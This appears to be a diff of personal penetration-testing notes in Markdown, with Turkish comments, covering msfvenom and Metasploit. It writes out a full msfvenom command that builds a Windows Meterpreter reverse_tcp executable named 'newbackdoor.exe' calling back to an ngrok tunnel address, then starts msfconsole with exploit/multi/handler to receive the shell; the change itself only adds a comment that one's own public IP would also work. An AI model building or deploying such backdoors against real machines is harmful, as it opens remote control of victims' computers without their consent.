@@ -12,7 +12,7 @@
 
 ## msfvenom
 
-- > msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows lhost=0.tcp.ngrok.io lport=11620 -f exe -o /root/newbackdoor.exe // lhost=0.tcp.ngrok.io lport=11620 ngroktan alındı
+- > msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows lhost=0.tcp.ngrok.io lport=11620 -f exe -o /root/newbackdoor.exe // lhost=0.tcp.ngrok.io lport=11620 ngroktan alındı. // Kendi public ip de kullanılabilirdi
 
 - > msfconsole
 - > use exploit/multi/handler
